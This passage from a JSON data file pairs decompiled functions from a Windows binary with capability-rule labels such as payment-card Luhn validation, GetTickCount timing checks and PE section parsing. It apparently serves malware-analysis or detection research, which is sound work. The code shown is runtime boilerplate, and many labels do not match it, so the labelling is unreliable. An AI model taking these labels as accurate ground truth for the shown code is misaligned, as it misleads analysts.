+ 8) + 0x38) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x3c + iVar3 * 2) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 671
    },
    "0046eca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046eca0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x54);\n        puVar4[1] = 0;\n        *puVar4 = 0x50af44;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        puVar4[0xe] = 0;\n        *(puVar4 + 0x52) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    iVar1 = *0x4f6d68;\n    *(puVar4 + 0x12) = 0x2e;\n    *(*(param_1 + 8) + 0x14) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x50208c;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x18) = 0x50208e;\n    *(*(param_1 + 8) + 0x1c) = 0;\n    *(*(param_1 + 8) + 0x20) = 0x50208e;\n    *(*(param_1 + 8) + 0x24) = 0;\n    *(*(param_1 + 8) + 0x28) = 0x50208e;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    *(*(param_1 + 8) + 0x30) = 0;\n    uVar2 = *0x5064d8;\n    *(*(param_1 + 8) + 0x34) = *0x5064d8;\n    *(*(param_1 + 8) + 0x38) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x3c + iVar3 * 2) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 669
    },
    "0046f090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046f090(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_1 + 8);\n    if (puVar1 == NULL) {\n        puVar1 = fcn.004a3500(200);\n        puVar1[1] = 0;\n        *puVar1 = 0x50ae24;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[7] = 0;\n        puVar1[8] = 0;\n        puVar1[9] = 0;\n        puVar1[10] = 0;\n        puVar1[0xb] = 0;\n        puVar1[0xc] = 0;\n        puVar1[0xd] = 0;\n        puVar1[0xe] = 0;\n        puVar1[0xf] = 0;\n        puVar1[0x10] = 0;\n        puVar1[0x11] = 0;\n        puVar1[0x12] = 0;\n        puVar1[0x13] = 0;\n        puVar1[0x14] = 0;\n        puVar1[0x15] = 0;\n        puVar1[0x16] = 0;\n        puVar1[0x17] = 0;\n        puVar1[0x18] = 0;\n        puVar1[0x19] = 0;\n        puVar1[0x1a] = 0;\n        puVar1[0x1b] = 0;\n        puVar1[0x1c] = 0;\n        puVar1[0x1d] = 0;\n        puVar1[0x1e] = 0;\n        puVar1[0x1f] = 0;\n        puVar1[0x20] = 0;\n        puVar1[0x21] = 0;\n        puVar1[0x22] = 0;\n        puVar1[0x23] = 0;\n        puVar1[0x24] = 0;\n        puVar1[0x25] = 0;\n        puVar1[0x26] = 0;\n        puVar1[0x27] = 0;\n        puVar1[0x28] = 0;\n        puVar1[0x29] = 0;\n        puVar1[0x2a] = 0;\n        puVar1[0x2b] = 0;\n        puVar1[0x2c] = 0;\n        puVar1[0x2d] = 0;\n        puVar1[0x2e] = 0;\n        puVar1[0x2f] = 0;\n        puVar1[0x30] = 0;\n        *(puVar1 + 0x31) = 0;\n        *(param_1 + 8) = puVar1;\n    }\n    puVar1[2] = \"%m/%d/%y\";\n    puVar1[3] = \"%m/%d/%y\";\n    puVar1[4] = 0x504ff5;\n    puVar1[5] = 0x504ff5;\n    puVar1[6] = 0x504ffe;\n    puVar1[7] = 0x504ffe;\n    puVar1[8] = 0x504fff;\n    puVar1[9] = 0x505002;\n    puVar1[10] = 0x504ffe;\n    puVar1[0xb] = 0x505005;\n    puVar1[0xc] = 0x50500c;\n    puVar1[0xd] = 0x505013;\n    puVar1[0xe] = 0x50501b;\n    puVar1[0xf] = 0x505025;\n    puVar1[0x10] = 0x50502e;\n    puVar1[0x11] = 0x505035;\n    puVar1[0x12] = 0x50503e;\n    puVar1[0x13] = 0x505042;\n    puVar1[0x14] = 0x505046;\n    puVar1[0x15] = 0x50504a;\n    puVar1[0x16] = 0x50504e;\n    puVar1[0x17] = 0x505052;\n    puVar1[0x18] = 0x505056;\n    puVar1[0x19] = 0x50505a;\n    puVar1[0x1a] = 0x505062;\n    puVar1[0x1b] = 0x50506b;\n    puVar1[0x1c] = 0x505071;\n    puVar1[0x1d] = 0x505077;\n    puVar1[0x1e] = 0x50507b;\n    puVar1[0x1f] = 0x505080;\n    puVar1[0x20] = 0x505085;\n    puVar1[0x21] = 0x50508c;\n    puVar1[0x22] = 0x505096;\n    puVar1[0x23] = 0x50509e;\n    puVar1[0x24] = 0x5050a7;\n    puVar1[0x25] = 0x5050b0;\n    puVar1[0x26] = 0x5050b4;\n    puVar1[0x27] = 0x5050b8;\n    puVar1[0x28] = 0x5050bc;\n    puVar1[0x29] = 0x505077;\n    puVar1[0x2a] = 0x5050c0;\n    puVar1[0x2b] = 0x5050c4;\n    puVar1[0x2c] = 0x5050c8;\n    puVar1[0x2d] = 0x5050cc;\n    puVar1[0x2e] = 0x5050d0;\n    puVar1[0x2f] = 0x5050d4;\n    puVar1[0x30] = 0x5050d8;\n    return;\n}\n",
        "token_count": 1502
    },
    "0046f7d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046f7d0(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_1 + 8);\n    if (puVar1 == NULL) {\n        puVar1 = fcn.004a3500(200);\n        puVar1[1] = 0;\n        *puVar1 = 0x50ae34;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[7] = 0;\n        puVar1[8] = 0;\n        puVar1[9] = 0;\n        puVar1[10] = 0;\n        puVar1[0xb] = 0;\n        puVar1[0xc] = 0;\n        puVar1[0xd] = 0;\n        puVar1[0xe] = 0;\n        puVar1[0xf] = 0;\n        puVar1[0x10] = 0;\n        puVar1[0x11] = 0;\n        puVar1[0x12] = 0;\n        puVar1[0x13] = 0;\n        puVar1[0x14] = 0;\n        puVar1[0x15] = 0;\n        puVar1[0x16] = 0;\n        puVar1[0x17] = 0;\n        puVar1[0x18] = 0;\n        puVar1[0x19] = 0;\n        puVar1[0x1a] = 0;\n        puVar1[0x1b] = 0;\n        puVar1[0x1c] = 0;\n        puVar1[0x1d] = 0;\n        puVar1[0x1e] = 0;\n        puVar1[0x1f] = 0;\n        puVar1[0x20] = 0;\n        puVar1[0x21] = 0;\n        puVar1[0x22] = 0;\n        puVar1[0x23] = 0;\n        puVar1[0x24] = 0;\n        puVar1[0x25] = 0;\n        puVar1[0x26] = 0;\n        puVar1[0x27] = 0;\n        puVar1[0x28] = 0;\n        puVar1[0x29] = 0;\n        puVar1[0x2a] = 0;\n        puVar1[0x2b] = 0;\n        puVar1[0x2c] = 0;\n        puVar1[0x2d] = 0;\n        puVar1[0x2e] = 0;\n        puVar1[0x2f] = 0;\n        puVar1[0x30] = 0;\n        *(puVar1 + 0x31) = 0;\n        *(param_1 + 8) = puVar1;\n    }\n    puVar1[2] = 0x5050dc;\n    puVar1[3] = 0x5050dc;\n    puVar1[4] = L\"%H:%M:%S\";\n    puVar1[5] = L\"%H:%M:%S\";\n    puVar1[6] = 0x505100;\n    puVar1[7] = 0x505100;\n    puVar1[8] = 0x505102;\n    puVar1[9] = 0x505108;\n    puVar1[10] = 0x505100;\n    puVar1[0xb] = L\"Sunday\";\n    puVar1[0xc] = L\"Monday\";\n    puVar1[0xd] = L\"Tuesday\";\n    puVar1[0xe] = L\"Wednesday\";\n    puVar1[0xf] = L\"Thursday\";\n    puVar1[0x10] = L\"Friday\";\n    puVar1[0x11] = L\"Saturday\";\n    puVar1[0x12] = 0x505180;\n    puVar1[0x13] = 0x505188;\n    puVar1[0x14] = 0x505190;\n    puVar1[0x15] = 0x505198;\n    puVar1[0x16] = 0x5051a0;\n    puVar1[0x17] = 0x5051a8;\n    puVar1[0x18] = 0x5051b0;\n    puVar1[0x19] = L\"January\";\n    puVar1[0x1a] = L\"February\";\n    puVar1[0x1b] = L\"March\";\n    puVar1[0x1c] = L\"April\";\n    puVar1[0x1d] = 0x5051f2;\n    puVar1[0x1e] = L\"June\";\n    puVar1[0x1f] = L\"July\";\n    puVar1[0x20] = L\"August\";\n    puVar1[0x21] = L\"September\";\n    puVar1[0x22] = L\"October\";\n    puVar1[0x23] = L\"November\";\n    puVar1[0x24] = L\"December\";\n    puVar1[0x25] = 0x505264;\n    puVar1[0x26] = 0x50526c;\n    puVar1[0x27] = 0x505274;\n    puVar1[0x28] = 0x50527c;\n    puVar1[0x29] = 0x5051f2;\n    puVar1[0x2a] = 0x505284;\n    puVar1[0x2b] = 0x50528c;\n    puVar1[0x2c] = 0x505294;\n    puVar1[0x2d] = 0x50529c;\n    puVar1[0x2e] = 0x5052a4;\n    puVar1[0x2f] = 0x5052ac;\n    puVar1[0x30] = 0x5052b4;\n    return;\n}\n",
        "token_count": 1456
    },
    "00470b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470b70(uint *param_1)\n\n{\n    sub.msvcrt.dll__fileno_1(*param_1);\n    return;\n}\n",
        "token_count": 38
    },
    "00470cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00470cc0(void)\n\n{\n    fcn.00470b70();\n    fcn.00428fb0();\n    return;\n}\n",
        "token_count": 34
    },
    "00470d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00470d20(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    \n    pcVar2 = _sym.imp.msvcrt.dll__errno;\n    if ((*param_1 == 0) && (param_2 != 0)) {\n        puVar3 = (*_sym.imp.msvcrt.dll__errno)();\n        uVar1 = *puVar3;\n        puVar3 = (*pcVar2)();\n        *puVar3 = 0;\n        do {\n            iVar5 = sub.msvcrt.dll_fflush(param_2);\n            if (iVar5 == 0) {\n                puVar3 = (*pcVar2)();\n                *puVar3 = uVar1;\n                *param_1 = param_2;\n                *(param_1 + 1) = 0;\n                return param_1;\n            }\n            piVar4 = (*pcVar2)();\n        } while (*piVar4 == 4);\n        puVar3 = (*pcVar2)();\n        *puVar3 = uVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 275
    },
    "00470f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00470f50(uint param_1, uint param_2)\n\n{\n    uchar auStack13 [13];\n    \n    fcn.0046d650(param_1, param_2, auStack13);\n    return;\n}\n",
        "token_count": 53
    },
    "004710e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004710e0(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    *param_1 = param_1 + 2;\n    fcn.00490c10(param_2, param_3 + param_2, 0);\n    return;\n}\n",
        "token_count": 75
    },
    "00471ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00471ee0(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, int32_t arg_2ch, int32_t *arg_30h)\n\n{\n    uint uVar1;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    if (arg_2ch == 0) {\n        var_2ch = 0;\n        var_28h._0_1_ = 0;\n        var_30h = &var_28h;\n        uVar1 = (**(*arg_ch + 0xc))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, &var_30h);\n        if (*arg_28h == 0) {\n            if (arg_30h[6] != NULL) {\n                (*arg_30h[6])(arg_30h);\n            }\n            *arg_30h = arg_30h + 2;\n            fcn.00490cd0(var_30h, var_2ch + var_30h, 0);\n            arg_30h[6] = 0x474020;\n        }\n        if (var_30h != &var_28h) {\n            fcn.004a34c0(var_30h);\n            return uVar1;\n        }\n    }\n    else {\n        uVar1 = (**(*arg_ch + 8))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 471
    },
    "004721b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.004721b0(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, int32_t arg_2ch, int32_t *arg_30h)\n\n{\n    uint uVar1;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    if (arg_2ch == 0) {\n        var_30h = &var_28h;\n        var_28h._0_2_ = 0;\n        var_2ch = 0;\n        uVar1 = (**(*arg_ch + 0xc))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, &var_30h);\n        if (*arg_28h == 0) {\n            if (arg_30h[6] != NULL) {\n                (*arg_30h[6])(arg_30h);\n            }\n            *arg_30h = arg_30h + 2;\n            fcn.00493a40(var_30h, var_30h + var_2ch * 2, 0);\n            arg_30h[6] = 0x4740a0;\n        }\n        if (var_30h != &var_28h) {\n            fcn.004a34c0(var_30h);\n            return uVar1;\n        }\n    }\n    else {\n        uVar1 = (**(*arg_ch + 8))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 490
    },
    "00472450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004724db)\n\nuint fcn.00472450(uint param_1, int32_t *param_2, uint param_3, uint param_4, uint32_t param_5, uint param_6, \n                 uint param_7)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint var_1ch_3;\n    int32_t in_stack_0000002c;\n    uint var_30h_2;\n    uint var_28h;\n    uint var_1ch_2;\n    uint var_20h;\n    uint var_30h;\n    uint32_t in_stack_fffffed0;\n    uchar *puStack256;\n    uchar auStack248 [8];\n    uint uStack240;\n    uchar *puStack236;\n    uint uStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uchar *puStack208;\n    uint32_t uStack204;\n    int32_t *piStack196;\n    uint uStack192;\n    uint uStack188;\n    uchar uStack184;\n    uint uStack180;\n    ushort uStack176;\n    ushort uStack172;\n    ulong uStack170;\n    int32_t *piStack160;\n    uchar uStack141;\n    int32_t iStack140;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack112;\n    int32_t *piStack100;\n    uint32_t uStack88;\n    uint var_20h_3;\n    int32_t var_3ch_2;\n    uint *var_30h_4;\n    uint var_28h_3;\n    \n    if (in_stack_0000002c == 0) {\n        puStack112 = 0x472536;\n        uVar3 = (**(*param_2 + 8))();\n        return uVar3;\n    }\n    if (*(in_stack_0000002c + 0x18) != 0) {\n        puStack112 = 0x47249b;\n        fcn.00490c10();\n        uStack120 = param_3;\n        uStack124 = 0x4724ce;\n        puStack112 = param_5 & 0xff;\n        uVar3 = (**(*param_2 + 0xc))();\n        return uVar3;\n    }\n    puStack112 = 0x47254d;\n    uStack124 = fcn.0049eb30(\"uninitialized __any_string\");\n    if (var_30h_4 != &fcn.00472450::var_28h_3) {\n        puStack112 = 0x472561;\n        fcn.004a34c0();\n    }\n    puStack112 = 0x472569;\n    fcn.0041b360();\n    uStack120 = param_7;\n    if (var_3ch_2 == 0) {\n        uStack204 = 0x472644;\n        puStack112 = &stack0xfffffffc;\n        uVar3 = (**(*piStack100 + 8))();\n        return uVar3;\n    }\n    iStack212 = *(var_3ch_2 + 0x18);\n    if (iStack212 == 0) {\n        uStack204 = 0x47268f;\n        puStack112 = &stack0xfffffffc;\n        uStack220 = fcn.0049eb30(0x5020d8);\n        uStack204 = 0x4726a2;\n        fcn.004640c0();\n        puStack208 = 0x4726ab;\n        uStack204 = uStack220;\n        fcn.0041b360();\n        if (piStack160 == NULL) {\n            puStack208 = &stack0xffffff90;\n            uVar3 = (**(*piStack196 + 8))\n                              (uStack192, uStack188, uStack184, uStack180, uStack176, CONCAT82(uStack170, uStack172));\n            return uVar3;\n        }\n        if (piStack160[6] != 0) {\n            puStack256 = &stack0xffffff08;\n            puStack208 = &stack0xffffff90;\n            fcn.00493990(*piStack160, *piStack160 + piStack160[1] * 2, in_stack_fffffed0 & 0xffffff00);\n            uVar3 = (**(*piStack196 + 0xc))(uStack192, uStack188, uStack184, uStack180, uStack176, &stack0xffffff00);\n            if (puStack256 != &stack0xffffff08) {\n                fcn.004a34c0(puStack256);\n            }\n            return uVar3;\n        }\n        puStack208 = &stack0xffffff90;\n        uVar3 = fcn.0049eb30(\"uninitialized __any_string\");\n        if (puStack256 != &stack0xffffff08) {\n            fcn.004a34c0(puStack256);\n        }\n        fcn.0041b360(uVar3);\n        iVar4 = *0x4f59f4;\n        *extraout_ECX = 0x509df0;\n        piVar1 = extraout_ECX[3];\n        if (iVar4 == 0) {\n            iVar4 = piVar1[1];\n            piVar1[1] = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = piVar1 + 1;\n            iVar4 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar4 == 1) {\n            (**(*piVar1 + 4))();\n        }\n        *extraout_ECX = 0x50b370;\n        fcn.0048f350(extraout_ECX + 2);\n        fcn.0048f380();\n        uVar3 = fcn.004a34c0(extraout_ECX);\n        return uVar3;\n    }\n    uStack204 = 0x4725b8;\n    puStack112 = &stack0xfffffffc;\n    fcn.004658c0();\n    uStack216 = 0x4725e6;\n    uStack204 = uStack88 & 0xff;\n    uVar3 = (**(*piStack100 + 0xc))();\n    if (*0x4f59f4 == 0) {\n        iVar4 = *(iStack140 + -4);\n        *(iStack140 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack140 + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        puStack236 = &stack0xffffff73;\n        uStack240 = 0x472672;\n        fcn.004640a0();\n        return uVar3;\n    }\n    return uVar3;\n}\n",
        "token_count": 1555
    },
    "00474220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl\nfcn.00474220(uint noname_0, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h\n            , int32_t arg_24h)\n\n{\n    uint *var_48h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_48h = &var_40h;\n    fcn.00490c10(arg_20h, arg_24h + arg_20h, 0);\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h, arg_1ch, &var_48h);\n    if (arg_10h[6] != NULL) {\n        (*arg_10h[6])(arg_10h);\n    }\n    *arg_10h = arg_10h + 2;\n    fcn.00490cd0(var_30h, var_2ch + var_30h, 0);\n    arg_10h[6] = 0x474020;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004a34c0(var_48h);\n    }\n    return;\n}\n",
        "token_count": 354
    },
    "00474600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00474600(uint noname_0, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *var_30h;\n    uint var_28h;\n    uint var_ch;\n    \n    var_30h = &var_28h;\n    fcn.00490c10(arg_10h, arg_14h + arg_10h, 0);\n    uVar1 = (**(*arg_ch + 8))(&var_30h, arg_18h);\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    return uVar1;\n}\n",
        "token_count": 187
    },
    "00474730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00474730(uint noname_0, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *var_30h;\n    uint var_28h;\n    uint var_ch;\n    \n    var_30h = &var_28h;\n    fcn.00490c10(arg_10h, arg_14h + arg_10h, 0);\n    uVar1 = (**(*arg_ch + 8))(&var_30h, arg_18h);\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    return uVar1;\n}\n",
        "token_count": 187
    },
    "004749f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.004749f0(uint noname_0, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_bp_4h;\n    \n    uVar1 = 0x474a16;\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h);\n    if (arg_10h[6] != NULL) {\n        (*arg_10h[6])(arg_10h);\n    }\n    *arg_10h = arg_10h + 2;\n    fcn.00490cd0(var_20h, var_1ch + var_20h, uVar1 & 0xffffff00);\n    arg_10h[6] = 0x474020;\n    if (var_20h != &fcn.004749f0::var_18h) {\n        fcn.004a34c0(var_20h);\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "00477160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00477160(int32_t param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    \n    cVar2 = fcn.0042ea40();\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.00476b70();\n        *(param_1 + 0x30) = 0;\n        *(param_1 + 0x54) = 0;\n        fcn.00476de0();\n        *(param_1 + 0x49) = 0;\n        uVar1 = *(param_1 + 0x40);\n        *(param_1 + 0x14) = 0;\n        *(param_1 + 4) = uVar1;\n        *(param_1 + 8) = uVar1;\n        *(param_1 + 0xc) = uVar1;\n        *(param_1 + 0x10) = 0;\n        *(param_1 + 0x18) = 0;\n        *(param_1 + 0x38) = *(param_1 + 0x34);\n        *(param_1 + 0x3c) = *(param_1 + 0x34);\n        iVar3 = fcn.00470c20();\n        if ((iVar3 != 0) && (cVar2 == '\\x01')) {\n            return param_1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 327
    },
    "00478df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00478df0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    char unaff_DI;\n    ulong uVar5;\n    int32_t in_stack_00000024;\n    \n    if (*(param_1 + 0x44) < 0x3fffffff) {\n        iVar1 = fcn.004a34e0(*(param_1 + 0x44) * 2);\n        *(param_1 + 0x48) = 1;\n        *(param_1 + 0x40) = iVar1;\n        return iVar1;\n    }\n    fcn.004a3c30();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    uVar5 = fcn.004a3c30();\n    if (uVar5 >> 0x20 != 1) {\n        fcn.0041b360(uVar5);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(unaff_EBX + 0x14) | 1;\n    *(unaff_EBX + 0x14) = uVar2;\n    if ((*(unaff_EBX + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(unaff_EBX + 0x1c) = 0;\n        }\n        else {\n            *(unaff_EBX + 0x20) = 0;\n        }\n        return unaff_EBX + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    iVar1 = *(unaff_EBX + 0x68);\n    uVar4 = extraout_ECX;\n    if ((iVar1 != unaff_EBP) && (iVar1 != 0)) {\n        fcn.004a34b0(iVar1);\n    }\n    *(unaff_EBX + 0x68) = iVar3;\n    *(unaff_EBX + 100) = uVar4;\n    return iVar3 + in_stack_00000024 * 8;\n}\n",
        "token_count": 691
    },
    "00479100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00479100(int32_t param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    \n    cVar2 = fcn.0042ea40();\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.00478b00();\n        *(param_1 + 0x30) = 0;\n        *(param_1 + 0x58) = 0;\n        fcn.00478d70();\n        *(param_1 + 0x49) = 0;\n        uVar1 = *(param_1 + 0x40);\n        *(param_1 + 0x14) = 0;\n        *(param_1 + 4) = uVar1;\n        *(param_1 + 8) = uVar1;\n        *(param_1 + 0xc) = uVar1;\n        *(param_1 + 0x10) = 0;\n        *(param_1 + 0x18) = 0;\n        *(param_1 + 0x38) = *(param_1 + 0x34);\n        *(param_1 + 0x3c) = *(param_1 + 0x34);\n        iVar3 = fcn.00470c20();\n        if ((iVar3 != 0) && (cVar2 == '\\x01')) {\n            return param_1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 327
    },
    "004863a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
